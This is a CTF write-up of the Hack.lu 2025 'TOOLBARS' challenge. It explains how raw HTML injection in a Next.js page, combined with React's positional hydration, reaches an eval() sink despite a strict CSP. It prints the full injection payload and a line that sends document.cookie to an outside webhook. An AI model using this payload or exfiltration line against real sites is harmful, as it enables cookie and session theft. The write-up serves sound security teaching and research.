+++
title = "TOOLBARS: React hydration as an exploit primitive (Hack.lu CTF 2025)"
date = 2025-10-20
summary = "dangerouslySetInnerHTML gives you raw HTML injection in a Next.js page. The CSP blocks every script execution path. The only eval() on the page reads from a React ref during hydration. Getting the payload there requires pre-corrupting the DOM tree before React walks it."
tags = ["web", "xss", "react", "nextjs", "ctf", "hydration", "csp"]
+++

TOOLBARS is a Next.js 15 web challenge from Hack.lu CTF 2025. Source is provided. There's raw HTML injection through `dangerouslySetInnerHTML` and there's a live `eval()` three components away. Getting from one to the other is the whole challenge. The CSP blocks every obvious bridge.

**Downloads:** [challenge-src.zip](/assets/downloads/toolbars/challenge-src.zip)

<img src="/assets/media/toolbars/01-challenge-overview.jpg" alt="The TOOLBARS challenge page, four draggable toolbar widgets on a Windows XP-style background" style="border:1px solid #ccc;max-width:100%;height:auto;display:block;margin:1.5em 0">

The challenge archive page (the CTF site was IKEA-themed -- very fitting for a toolbar challenge) shows 10 solves and a price tag of $313:

<img src="/assets/media/toolbars/00-challenge-page.jpg" alt="Hack.lu CTF 2025 archive page for TOOLBARS showing Sold: 10, Price: $313, Designer: pspaul" style="border:1px solid #ccc;max-width:100%;height:auto;display:block;margin:1.5em 0">

---

## Reading the Source

### `page.js`

```js
export default async function Home({ searchParams }) {
  const { md } = await searchParams;
  return (
    <div className="page">
      <header>
        <CounterBar />
        <RotatorBar />
        <MarkdownBar md={md} />
        <CalcBar />
      </header>
      <main>
        <h1>{metadata.title}</h1>
        <h3>{metadata.description}</h3>
      </main>
    </div>
  );
}
```

A React Server Component. `md` from the query string goes straight to `MarkdownBar`. No filter. `metadata` is exported from `layout.js`:

```js
export const metadata = {
  title: "Toolbars",
  description: "Good ol' toolbars, helpful as ever.",
};
```

The order matters: CounterBar, RotatorBar, MarkdownBar, CalcBar. CalcBar is always the fourth child of `<header>`. We'll need that.

---

### `MarkdownBar.js`

```js
export default function MarkdownBar({ md }) {
  return (
    <Toolbar logo="/markdown.png" name="Markdown">
      { md
        ? <div
            suppressHydrationWarning={true}
            dangerouslySetInnerHTML={{ __html: renderMarkdown(md) }}
          />
        : <a href="?md=...">Example</a>
      }
    </Toolbar>
  );
}

function renderMarkdown(md) {
  return md.replace(/\*\*([^*]+)\*\*/g, "<strong>$1</strong>")
           .replace(/\*([^*]+)\*/g, "<em>$1</em>")
           .replace(/`([^`]+)`/g, "<code>$1</code>");
}
```

`renderMarkdown` does no sanitisation. Any HTML you put in `?md=` ends up in `dangerouslySetInnerHTML.__html` verbatim.

Two React props on that div. During hydration, React walks each DOM node and applies props from the RSC payload. For most nodes it just checks for mismatches. For a `dangerouslySetInnerHTML` node, React always calls `element.innerHTML = html`. This is in `updateDOMProperties` in the reconciler, the same path that runs during a normal re-render, not special hydration-only code. `suppressHydrationWarning` suppresses the console warning React would otherwise emit about the mismatch between the document-parsed DOM and the fragment-parsed result. The innerHTML assignment happens either way. This distinction matters: the attack relies on `innerHTML` running unconditionally, not being skipped when the content happens to match.

<img src="/assets/media/toolbars/02-markdown-rendered.jpg" alt="MarkdownBar showing rendered markdown: italic, bold, and code" style="border:1px solid #ccc;max-width:100%;height:auto;display:block;margin:1.5em 0">

---

### `CalcBar.js`

```js
"use client";

import { useState, useEffect, useMemo, useRef } from "react";
import Toolbar from "./Toolbar";

export default function CalcBar() {
  const [code, setCode] = useState();
  const input = useRef(null);

  const result = useMemo(() => {
    if (!code?.length) return "";
    try { return String(eval(code)); } catch (e) { return ""; }
  }, [code]);

  // init
  useEffect(() => {
    const inputElem = input.current;
    setCode(inputElem.value);
  }, []);

  return (
    <Toolbar logo="/calc.png">
      <input
        placeholder="2+2"
        ref={input}
        value={code}
        onChange={e => setCode(e.target.value)}
      />
      &nbsp;=&nbsp;
      <code>{result}</code>
    </Toolbar>
  );
}
```

The sink is `eval(code)`. On first mount:

1. `useState()` → `code = undefined`, `result = ""`
2. Component renders with `value={undefined}`. React omits HTML attributes when a prop is `undefined`, so the SSR `<input>` has no `value` attribute. It's uncontrolled.
3. `useEffect` fires after hydration: reads `input.current.value`, calls `setCode(that value)`
4. `useMemo` recalculates: `eval(code)`

If we control `input.current.value` at the time `useEffect` runs, we win. `input.current` is a React ref. During hydration, React walks the DOM and assigns each ref to the DOM element at the ref's position in the component tree. Control the DOM element at that position, control the ref.

<img src="/assets/media/toolbars/03-calcbar-working.jpg" alt="CalcBar showing 2+2 = 4" style="border:1px solid #ccc;max-width:100%;height:auto;display:block;margin:1.5em 0">

---

### `Toolbar.js`

```js
export default function Toolbar({ name, logo, style, children }) {
  return (
    <section draggable style={style} className="toolbar">
      <div>...</div>
      <div>x</div>
      <div>{ logo && <img src={logo} alt="Logo" /> }{ name ?? '' }</div>
      <div>{children}</div>
    </section>
  );
}
```

No `"use client"` directive. This is a Server Component. The `...` in the first div is a literal three-character string, not a placeholder. Every toolbar renders as `<section draggable="true" class="toolbar">` with four child divs: drag handle (`...`), close button (`x`), icon+name, and content. CalcBar's SSR output looks like:

```html
<section draggable="true" class="toolbar">
  <div>...</div>
  <div>x</div>
  <div><img src="/calc.png" alt="Logo"></div>
  <div>
    <input placeholder="2+2">
    &nbsp;=&nbsp;
    <code></code>
  </div>
</section>
```

No `value` attribute because `value={undefined}`.

---

### `middleware.js`

```js
export function middleware() {
  const nonce = crypto.randomUUID();
  const csp = `
    default-src 'self';
    script-src 'self' 'nonce-${nonce}' 'strict-dynamic' 'unsafe-eval';
    img-src 'self' data:;
    object-src 'none';
    base-uri 'self';
    form-action 'self';
    frame-ancestors 'none';
    upgrade-insecure-requests;
  `.replace(/\s+/g, " ").trim();
  ...
}
```

Fresh random nonce per request. The important bits:

| what | verdict |
|---|---|
| `<script>` injection | blocked: `'unsafe-inline'` not set, nonce unknown |
| `<img onerror=...>` | blocked: inline handlers need `'unsafe-inline'` |
| `javascript:` href | blocked: `'unsafe-inline'` |
| external script load | blocked: `'strict-dynamic'` propagates trust only transitively through nonce'd parents, not from arbitrary origins |
| `eval(str)` from loaded script | **allowed**: `'unsafe-eval'` is set |
| `location.href = "https://evil.com"` | **allowed**: no `navigate-to` directive |
| `document.cookie` from same origin | **allowed**: CSP controls script execution, not DOM reads |

`'unsafe-eval'` is there for CalcBar to work. The challenge is explicitly saying: get to eval.

---

### `bot.js`

```js
const cookies = [{
    name: 'flag',
    value: FLAG,
    url: `https://${APP_DOMAIN}`,
    secure: true,
    sameSite: 'Strict'
}];
await page.setCookie(...cookies);
await page.goto(url, { waitUntil: [] });
await sleep(10_000);
```

`sameSite: 'Strict'` means the cookie isn't sent on cross-origin requests. But `document.cookie` reads it just fine from same-origin JavaScript. We need JS running inside `toolbar.guru`.

---

## Why everything obvious fails

**`<script>alert(1)</script>`**: blocked by CSP, no `'unsafe-inline'`, nonce is fresh each request.

**`<img src=x onerror="...">`**: blocked, inline event handlers require `'unsafe-inline'`.

**`<a href="javascript:...">`**: blocked, same reason.

**Breaking out with closing tags:** The `dangerouslySetInnerHTML` div is nested inside:

```
<section class="toolbar">          ← MarkdownBar section
  <div>...</div>
  <div>x</div>
  <div><img...> Markdown</div>
  <div>                            ← children div (outer)
    <div suppresshydrationwarning> ← our injection target (inner)
      OUR ?md= CONTENT
```

Inject `</div></section>` and in the **server HTML** (full document parser) that works: the closing tags escape the structure and content lands at header level.

On the client, React hydrates MarkdownBar and calls:

```js
suppressHydrationWarning_div.innerHTML = serverRenderedHTML;
```

The browser's `innerHTML` setter uses a **fragment parser**, not the full document parser. The fragment parser ignores closing tags that would close the context element or any of its ancestors; you can't escape the div you're setting via `innerHTML`. The `</div>` and `</section>` are silently dropped. Content lands back inside the suppressHydrationWarning div.

So after hydration:
- **Server HTML**: closing tags work, content is at header level
- **React hydration innerHTML call**: closing tags are ignored, content is trapped inside the div

We're stuck inside.

<img src="/assets/media/toolbars/09-console-ssr-escape.jpg" alt="Console showing fetch of the raw SSR HTML with the injection string appearing at header level in the page source" style="border:1px solid #ccc;max-width:100%;height:auto;display:block;margin:1.5em 0">

Fetching the raw SSR HTML confirms the escape happened at the server level: the injected content appears at header level in the page source, not inside the div. The browser's document parser placed it correctly.

<img src="/assets/media/toolbars/08-console-trap.jpg" alt="Console showing error #418 and markerParentTag: 'DIV' -- the marker element trapped inside the div after hydration" style="border:1px solid #ccc;max-width:100%;height:auto;display:block;margin:1.5em 0">

After React runs, `markerParentTag: 'DIV'` -- the marker ended up inside the div. React threw error #418 because the MarkdownBar subtree no longer matches the RSC payload after the innerHTML reassignment. The SSR HTML had the escape; the post-hydration DOM doesn't.

<img src="/assets/media/toolbars/diag-01-parser-asymmetry.svg" alt="Diagram showing the same injection string behaving differently in full-page HTML parse versus innerHTML fragment parse" style="max-width:100%;height:auto;display:block;margin:1.5em 0">

The asymmetry is a property of the two parsing modes, not of React specifically. The full-page HTML parser tracks a stack of open elements and interprets closing tags against that stack. The fragment parser used by `innerHTML` starts with an empty stack and cannot close its own context element from the inside. Same bytes, different context, different trees.

---

## How SSR and hydration work in Next.js

Visiting a Next.js App Router page triggers two things on the server in parallel:

**1. HTML stream.** React Server Components (`page.js`, `Toolbar.js`, `MarkdownBar.js`) run server-side and produce raw HTML. This gets sent to the browser immediately, before any JavaScript loads, so the page appears rendered on first paint.

**2. RSC payload.** The same component tree is also serialised as a structured component description: which client components exist, what props they received, how the tree nests. This gets embedded as `<script>self.__next_f.push([...])</script>` tags in the same HTTP response.

Then on the client:

**3. Browser builds the DOM** from the HTML stream. The full document parser runs to completion and produces the DOM tree. No JavaScript has run yet.

**4. React hydrates.** The JS bundle loads, reads the RSC payload, and walks it against the existing DOM simultaneously, matching by `childNodes` position in document order. React attaches event listeners, resolves refs, and starts client component state. It does **not** recreate DOM nodes. It adopts the existing ones.

The RSC payload encodes positions: "CalcBar is the fourth child of `<header>`." React doesn't search for CalcBar by component type; it walks to position [3] and uses whatever DOM element is there. This positional walk is the primitive the exploit is built on.

---

## How React hydrates a Next.js page

<img src="/assets/media/toolbars/07-console-baseline.jpg" alt="Console output showing header.childNodes with 4 section.toolbar elements, CalcBar at index 3 with input placeholder '2+2'" style="border:1px solid #ccc;max-width:100%;height:auto;display:block;margin:1.5em 0">

Querying `header.childNodes` on the unmodified page: four `section.toolbar` elements, CalcBar's input at index `[3]` with placeholder `'2+2'`. This is the position we need to control.

Client components (`CalcBar`, `CounterBar`, `RotatorBar`) are also server-rendered, but React needs to hydrate them: attach refs, wire up event handlers, and start state. It does this by **walking the RSC payload tree and the actual DOM simultaneously** using `childNodes` in document order.

```
RSC payload:              DOM (after browser parsing):
header                    header
  section[0] ← CounterBar  ←→  section.toolbar
  section[1] ← RotatorBar  ←→  section.toolbar
  section[2] ← MarkdownBar ←→  section.toolbar
  section[3] ← CalcBar     ←→  section.toolbar  ← key
```

<img src="/assets/media/toolbars/diag-02-hydration-walk.svg" alt="Diagram showing React walking RSC payload tree and DOM childNodes in parallel, with CalcBar at header[3] being hydrated onto our injected fake section" style="max-width:100%;height:auto;display:block;margin:1.5em 0">

React walks to `header.childNodes[3]` and hydrates CalcBar onto whatever it finds there. During that walk, when it reaches the `<input ref={input}>` JSX node, it sets `input.current` to the DOM `<input>` at that position in the existing DOM tree. No re-creation happens; the DOM node is adopted in place.

If the structure at `childNodes[3]` matches CalcBar's render (same tag, same tree shape), React adopts it and moves on. If there's a structural mismatch severe enough, React falls back to a full client re-render of that component, which replaces our injected DOM with a freshly created version. We want adoption, not re-render.

React matches by tag name. If the tag name at a given DOM position doesn't match what the RSC payload expects, React throws a hydration error. For client components, React wraps the entire component's hydration in an error boundary; if any hydration error is thrown during the walk, the whole component is discarded and re-rendered from scratch on the client. Tag name mismatches are fatal. Missing text nodes and extra attributes emit warnings but don't trigger a re-render by themselves. For uncontrolled inputs, React explicitly avoids overwriting `element.value` during hydration, by deliberate design to preserve pre-filled form state.

---

## The exploit

The idea: put a structurally-identical fake CalcBar section at `header.childNodes[3]` before React walks the DOM. With a `value="PAYLOAD"` on the fake input, React adopts the section, attaches `input.current` to our input, `useEffect` reads `input.current.value = "PAYLOAD"`, and `eval("PAYLOAD")` runs.

Three sub-problems to solve.

### Placing content at header level

We need our fake section to end up as the fourth child of `<header>` after the browser's full document parser processes the SSR HTML.

We inject `</div></section>` from inside the suppressHydrationWarning div:

- `</div>` closes the suppressHydrationWarning (inner) div. We're now inside the children (outer) div.
- `</section>`: the full document parser's "in-body" rules walk up the open elements stack looking for a matching `<section>`. Per the HTML5 spec, closing a `<section>` causes everything stacked above it to be implicitly closed: the outer (children) div first, then the section itself. This is the same mechanism that lets you write `<li>item 1<li>item 2` without explicit `</li>` tags; the parser handles structural cleanup when it encounters a closing tag.

We're at header level. Place the fake CalcBar section.

### Constructing the fake section

It has to match CalcBar's SSR output exactly:

```html
<section draggable="true" class="toolbar">
  <div>...</div>
  <div>x</div>
  <div><img src="/calc.png" alt="Logo"></div>
  <div>
    <input placeholder="2+2" value="PAYLOAD">
    &nbsp;=&nbsp;
    <code></code>
  </div>
</section>
```

A few things that have to match exactly:
- `draggable="true"` with the value (not just `draggable`)
- `class="toolbar"`: exact class name
- Three divs before the content div
- Logo div has no text (CalcBar passes no `name` to Toolbar)
- `&nbsp;=&nbsp;`: the literal HTML entities from CalcBar's JSX, not regular spaces
- Empty `<code></code>` matching the initial empty `result`
- `value="PAYLOAD"`: React leaves this alone for uncontrolled inputs

### Fixing the page structure

After our fake section, the SSR stream continues with Next.js's own closing tags for MarkdownBar. Those closing tags now fire at header level, eventually closing `<div class="page">`, which pushes `<main>` outside it. The RSC payload expects `main` to be a child of `div.page`. It's not. React throws a hydration error and falls back to a full client re-render of the affected subtree, which includes everything inside `div.page`, including CalcBar. That re-render replaces our fake section with a freshly rendered empty input.

Fix: reconstruct the remaining page structure ourselves:

```
</header><main><h1>Toolbars</h1><h3>Good ol' toolbars, helpful as ever.</h3></main>
```

`</header>` closes the header and absorbs the SSR's redundant closing tags. The `<main>` block has to exactly match what Next.js rendered from `metadata` in `layout.js`: `"Toolbars"` and `"Good ol' toolbars, helpful as ever."`. React sees `header` with four sections, `main` with the right text, no mismatch, CalcBar adopted from our fake section.

The real CalcBar section from the SSR stream ends up after `</main>` at body level, outside `div.page`. React's hydration walk is driven by the RSC payload tree; once it's matched all four sections in the payload's header subtree, it stops looking. The orphan section at body level is outside the RSC component tree entirely; React doesn't touch it.

---

## Putting it together

```
?md=</div></section><section draggable="true" class="toolbar"><div>...</div><div>x</div><div><img src="/calc.png" alt="Logo"></div><div><input placeholder="2+2" value="document.title='PWNED'">&nbsp;=&nbsp;<code></code></div></section></header><main><h1>Toolbars</h1><h3>Good ol' toolbars, helpful as ever.</h3></main>
```

<img src="/assets/media/toolbars/04-exploit-pwned.jpg" alt="Exploit firing, CalcBar shows the payload in the input and PWNED as the result" style="border:1px solid #ccc;max-width:100%;height:auto;display:block;margin:1.5em 0">

<img src="/assets/media/toolbars/05-exploit-zoom.png" alt="Zoomed in, input shows the payload expression, result code shows PWNED" style="border:1px solid #ccc;max-width:100%;height:auto;display:block;margin:1.5em 0">

`eval("document.title='PWNED'")` returns `"PWNED"` (the value of the assignment), which renders in `<code>`. `useEffect` fired, eval ran.

<img src="/assets/media/toolbars/10-console-working.jpg" alt="Console showing calcInput: '1+1', codeResult: '2', headerChildCount: 4 -- exploit confirmed with no hydration errors" style="border:1px solid #ccc;max-width:100%;height:auto;display:block;margin:1.5em 0">

Verifying with a simpler payload: `headerChildCount: 4`, `calcInput: '1+1'`, `codeResult: '2'`. No hydration errors. The fake section was adopted at header[3], `useEffect` read the value, eval ran. The page fix (`</header><main>...</main>`) gave React a structurally correct DOM so no re-render was triggered.

One visible side-effect: the injected `<section class="toolbar">` exists in the DOM as a real element, so the browser renders it as an actual toolbar on the page. React never touches it after hydration, so it stays there -- a ghost toolbar with the input pre-filled to `1+1`.

<img src="/assets/media/toolbars/11-secondary-bar.jpg" alt="The injected fake CalcBar section rendered as a visible toolbar on the page, showing the pre-filled input" style="border:1px solid #ccc;max-width:100%;height:auto;display:block;margin:1.5em 0">

For the actual payload, swap `document.title='PWNED'` with:

```
location.href='https://WEBHOOK?c='+encodeURIComponent(document.cookie)
```

`location.href` navigation isn't restricted by this CSP; `navigate-to` is a separate directive that isn't set here. The flag cookie is `sameSite: Strict` but that only blocks cross-origin *requests*; `document.cookie` reads it fine from same-origin JavaScript. The bot visits our crafted URL, React hydrates our fake section, eval fires, `location.href` sends the cookie to our webhook.

The whole value passed to `?md=` needs to be percent-encoded in the URL. That's the URL in the screenshots above.

---

## Flag

<img src="/assets/media/toolbars/06-flag-exfil.png" alt="Webhook showing the exfiltrated flag cookie" style="border:1px solid #ccc;max-width:100%;height:auto;display:block;margin:1.5em 0">

```
flag{hydration_is_important}
```

---

## Takeaways

**`dangerouslySetInnerHTML` = unconditional innerHTML during hydration.** This is in React's reconciler (`updateDOMProperties`), not hydration-specific code. `suppressHydrationWarning` only kills the console warning about the resulting mismatch. The innerHTML call runs either way. If I'd assumed `suppressHydrationWarning` skipped the reassignment entirely, the attack model breaks and I'd have been chasing something that couldn't work.

**Document parser vs fragment parser asymmetry.** `</section>` in a full page parse walks up the open elements stack and implicitly closes ancestors. The same `</section>` via `element.innerHTML = ...` is silently dropped. The fragment algorithm can't close its own context element. This asymmetry is what lets the SSR phase place content at header level while hydration's innerHTML call puts it back inside the div.

**React's hydration walk is positional.** It matches DOM nodes against the RSC payload tree by position in `childNodes`, not by searching for a matching component. Put the right structure at the right position before React walks the DOM and it adopts your elements in-place, refs included.

**`value={undefined}` = uncontrolled.** React skips writing to `element.value` during hydration for uncontrolled inputs. This is a deliberate feature: it preserves pre-filled form data. Here it's the gap that lets the injected `value="PAYLOAD"` attribute survive untouched from document parse through to `useEffect`.

**CSP with `'unsafe-eval'` and no inline execution is only as safe as "nothing can reach eval".** This challenge has an eval sink and a CSP that blocks every obvious path to it. The path exists, but it requires knowing a React reconciler detail most people haven't thought about as an attack surface.
